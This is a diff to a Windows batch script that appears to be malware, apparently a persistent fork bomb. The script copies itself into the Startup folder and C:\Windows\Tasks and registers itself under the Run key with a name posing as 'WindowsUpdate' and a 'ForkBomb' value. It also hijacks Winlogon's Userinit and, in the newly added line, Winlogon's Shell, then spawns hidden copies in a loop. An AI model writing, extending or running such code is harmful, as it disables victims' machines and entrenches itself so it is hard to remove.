@@ -1,7 +1,8 @@
 @echo off
 
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-copy %0 "C:\Windows\Tasks\ScheduleUpdate.bat" >nul
+copy %0 "C:\Windows\Tasks\bat.bat" >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%0" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ForkBomb_%random%" /t REG_SZ /d "%~f0" /f 2>nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
@@ -55,5 +56,6 @@ set "p= /c"
 start /min cmd /c "C:\Windows\System32\drivers\etc\hosts.bat"
 
 goto loop
+
 
 
